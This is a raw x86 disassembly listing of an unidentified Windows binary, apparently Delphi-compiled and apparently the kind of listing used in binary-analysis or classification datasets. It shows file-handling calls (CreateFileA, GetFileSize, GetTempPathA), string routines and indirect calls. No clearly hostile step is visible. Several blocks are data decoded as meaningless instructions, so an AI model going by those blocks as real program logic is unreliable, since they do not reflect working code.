mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46e2c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_46e37e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46e361
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e368
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_46e390
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_46e453
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
mov eax [ ebp - 0x8 ]
call sub_4081bc
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
mov eax [ ebp - 0xc ]
call sub_4081bc
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
mov eax [ ebp - 0x10 ]
call sub_4081bc
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
mov eax [ ebp - 0x14 ]
call sub_4081bc
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e45a
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403f74
retn
sub_46e478
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e506
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46cf54
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403fa4
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e50d
lea eax [ ebp - 0x18 ]
call sub_403f50
retn
sub_46e518
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e5a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46cf54
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403fa4
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e5ad
lea eax [ ebp - 0x18 ]
call sub_403f50
retn
sub_46e5b8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_46e5d8
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_46e632
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e639
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
sub_46e640
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_46e69a
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e6a1
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_46e6a8
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_46e6dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_46e77d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_46d118
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e784
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c80
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408df4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403fa4
sub_46e78c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e7c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e7cc
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_46e7fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e821
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e828
retn
sub_46e97d
push ebx
inc esp
jo r-xdata
rcl [ ebx + 0x56 ] 0x8b
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c340
pop esi
pop ebx
retn
outsb
outsb
je r-xdata
pop es
jb r-xdata
inc esi
popad
insb
jae r-xdata
sar [ ebp + 0x2 ] 0x1
push esp
jb r-xdata
sar [ ebx ] 0xd0
jge r-xdata
or [ ecx + 0x64 ] cl
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
nop
movsb [ edi ] [ esi ]
jmp 0x257e9ec
retn
jb r-xdata
pop es
mov eax edx
sub_46eae8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46eb47
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_40459c
mov eax [ ebx ]
call sub_404410
push eax
mov eax [ ebx ]
call sub_404210
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_40459c
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_46e9e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eb4e
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_46eb54
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ec1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_40435c
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_407d30
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407d30
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_404554
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404470
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403fa4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ec24
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f74
retn
push ebx
mov eax edi
call sub_404210
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404470
mov eax ebx
call sub_403f50
jmp r-xdata
sub_46ec3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_46eb54
mov eax esi
mov edx r-xdata
call sub_40435c
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_404554
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404470
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_403fa4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_404210
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404470
jmp r-xdata
mov eax ebx
call sub_403f50
jmp r-xdata
sub_46ed28
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax esi
call sub_404210
mov edi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
mov bl [ eax ]
inc eax
mov [ esp + 0x8 ] eax
mov esi [ esp ]
mov ebp edi
dec ebp
mov edi [ esp + 0x4 ]
sub edi ebp
test ebp ebp
jne r-xdata
test edi edi
jle r-xdata
test edi edi
jle r-xdata
xor eax eax
cmp bl [ esi ]
jne r-xdata
cmp bl [ esi ]
jne r-xdata
inc esi
inc esi
mov ecx ebp
mov edx [ esp + 0x8 ]
mov eax esi
call sub_407dd8
test al al
je r-xdata
inc esi
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
inc eax
jmp r-xdata
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
jmp r-xdata
jmp r-xdata
sub_46edb4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebx eax
mov eax ebx
call sub_404210
mov edi eax
mov eax [ esp ]
call sub_404210
mov esi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp esi edi
jge r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
mov ebx [ esp ]
cmp [ esp + 0x4 ] 0x0
jbe r-xdata
mov al [ ebp ]
mov [ esp + 0x8 ] al
inc ebp
dec edi
sub esi edi
test esi esi
jg r-xdata
add ebx [ esp + 0x4 ]
dec ebx
inc esi
sub esi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
jmp r-xdata
xor eax eax
mov al [ ebx ]
cmp al [ esp + 0x8 ]
jne r-xdata
inc ebx
inc ebx
mov ecx edi
mov edx ebp
mov eax ebx
call sub_407dd8
test al al
je r-xdata
dec esi
test esi esi
jg r-xdata
mov eax ebx
sub eax [ esp ]
jmp r-xdata
sub_46ee40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46eef3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eefa
retn
mov eax rw-data
call sub_40d130
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_4049cc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4049cc
mov eax rw-data
call sub_403f50
mov eax rw-data
mov edx [ r-xdata ]
call sub_405110
mov eax rw-data
mov edx [ r-xdata ]
call sub_405110
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_4049cc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4049cc
sub_46eefc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_46efcf
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46efd6
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea eax [ ebp - 0x4 ]
call sub_46eae8
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403fa4
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402c80
jne r-xdata
mov eax sub_40c380
mov [ rw-data ] eax
mov [ rw-data ] sub_46ed20
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405104
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fa4
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405104
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fa4
sub_46f155
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ebx + esi * 8 ] dh
inc esi
add [ eax + 0x4400418c ] dl
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + 0x480046f2 ] al
sub [ eax ] eax
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
outsb
je r-xdata
xor [ eax ] eax
inc esi
jb r-xdata
or eax 0x8bfff942
fimul [ ebx + 0x55c033f0 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
add eax [ eax ]
push ss
inc ecx
jo r-xdata
push [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jpe r-xdata
mov [ rw-data ] esi
cmp [ rw-data ] 0x0
je r-xdata
dec ecx
insb
jb r-xdata
add bh bh
add [ eax ] eax
inc edx
popad
jae r-xdata
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x31 ] 0x1
mov [ esi + 0x34 ] 0xfa
mov [ esi + 0x38 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f316
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
push sub_46f30f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_420fcc
test [ esi + 0x1c ] 0x10
mov ebx edx
mov esi eax
xor eax eax
add esp 0xfffffff0
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov eax eax
mov al 0xf1
inc esi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
outsb
je r-xdata
push ebp
je r-xdata
popad
je r-xdata
inc esi
jb r-xdata
je r-xdata
sbb eax 0x46f6fffb
sbb al 0x10
cmp al 0x10
inc eax
add [ eax + eax ] dh
add bh bh
xor al 0x0
call sub_4034a0
dec eax
outsd
outsb
arpl [ ecx + 0x74 ] sp
jpe r-xdata
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
nop
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
push 0x64496e65
insb
imul ebp [ edi + 0x6e ] 0x50736148
inc edx
popad
jae r-xdata
popad
jae r-xdata
int1
inc esi
add [ eax + esi * 8 + 0x60046 ] ch
adc [ ecx + 0x64 ] cl
inc ecx
outsb
je r-xdata
add al 0x0
or ecx [ ecx + 0x64 ]
insb
push esp
imul ebp [ ebp + 0x65 ] 0x74754f
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e4f0c00
insb
jns r-xdata
inc [ ecx ]
inc esi
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xfa ] al
jpe r-xdata
add [ eax ] al
add [ eax ] al
inc edx
popad
jae r-xdata
add [ eax ] al
cmp dl 0x0
add [ eax ] al
add al 0x0
add [ eax ] dl
inc eax
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ gs : eax ] dl
inc eax
add [ ecx ] dh
add [ eax ] al
sub_46f334
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421018
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_46f360
push ebx
push esi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_46f3a4
test al al
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
sete al
or bl al
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_46f3a4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
call sub_46ed04
test al al
jne r-xdata
test al al
je r-xdata
mov al 0x1
retn
mov eax [ rw-data ]
mov al [ eax + 0x30 ]
sub_46f3cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46f3f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f3f8
retn
sub_46f718
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420fcc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_46f78a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
add esp 0xfffffff0
call sub_4034a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f791
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ r-xdata ]
call sub_46d094
mov edx [ rw-data ]
mov [ edx ] eax
sub_46f7b0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403508
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_421018
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_46f817
push [ fs : eax ]
mov [ fs : eax ] esp
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f81e
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ rw-data ]
call sub_40d130
sub_46f83c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46f8e7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x32 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f8ee
lea eax [ ebp - 0x10 ]
call sub_403f50
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax [ ebp + 0x8 ]
inc eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
call sub_408df4
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
xor ecx ecx
call sub_408df4
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
jmp r-xdata
sub_46f8f8
push ebx
push esi
xor ebx ebx
mov bl dl
lea ebx [ ebx + ebx * 2 ]
inc [ eax + ebx * 4 + 0x58 ]
cmp [ eax + ebx * 4 + 0x58 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ eax + ebx * 4 + 0x54 ] ecx
xor esi esi
mov [ eax + ebx * 4 + 0x50 ] esi
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_46f930
push ebx
push esi
xor ebx ebx
mov bl dl
lea esi [ ebx + ebx * 2 ]
cmp [ eax + esi * 4 + 0x58 ] 0x0
jle r-xdata
pop esi
pop ebx
retn
add [ eax + esi * 4 + 0x50 ] ecx
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ecx [ eax + esi * 4 + 0x50 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_46f960
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
lea edi [ eax + eax * 2 ]
cmp [ esi + edi * 4 + 0x58 ] 0x1
jne r-xdata
dec [ esi + edi * 4 + 0x58 ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x4a ] 0x0
je r-xdata
mov ecx ebx
mov edx esi
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
sub_46f990
or [ eax ] eax
add [ eax ] al
test [ 0x7db80048 ] dl
dec eax
add [ eax - 0x47ffb7eb ] al
jge r-xdata
mov [ eax ] esp
add [ ebp + edx + 0x48 ] bh
add [ eax + 0x7800487d ] bh
adc eax 0x7db80048
dec eax
add [ ebp + edx + 0x48 ] dh
add [ eax ] ch
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fa1f
retn
mov eax rw-data
mov ecx 0x9
mov edx [ r-xdata ]
call sub_4049cc
inc eax
add al ch
retn 0xf94f
inc [ rw-data ]
jne r-xdata
add [ eax + 0x15 ] dh
dec eax
add [ eax ] bh
or [ eax ] 0x6c
adc eax 0x7c3c0048
dec eax
add [ eax + 0x15 ] ch
dec eax
add [ eax + 0x6400487e ] bh
adc eax 0x7cc80048
dec eax
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46fa18
push [ fs : eax ]
mov [ fs : eax ] esp
sub_46fa50
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr st2
inc esi
add [ eax - 0x4fffb905 ] al
sti
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x2c0046fb ] bl
add [ eax ] al
add [ edi + ebx * 2 ] bh
popad
outsb
insb
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
outsb
insb
mov eax eax
mov al 0xfb
inc esi
add [ edi ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
cli
inc esi
add [ eax ] ah
add [ eax ] al
add al cl
pushad
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
xor al 0x91
inc eax
add al bl
cli
inc esi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
[ eax + eax ]
outsd
jb r-xdata
cmp al 0x10
inc eax
add [ eax ] ch
popad
outsb
insb
push esp
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
mov al [ 0xffffffff900046fe ]
sub al 0x0
add [ eax ] al
cmp al 0x5f
popad
outsb
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb ch bh
mov ah 0xfc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 8 + 0xc0046 ] dh
add [ eax ] al
[ eax ]
dec ebp
imul ebp [ esi + 0x3c ] 0x28004010
add [ 0x65696c43 ] cl
outsb
je r-xdata
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
popad
outsb
insb
add al 0x0
cmp al 0x10
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
mov al [ 0xc004191 ]
xchg esi eax
inc ecx
add [ eax ] dl
xchg esi eax
inc ecx
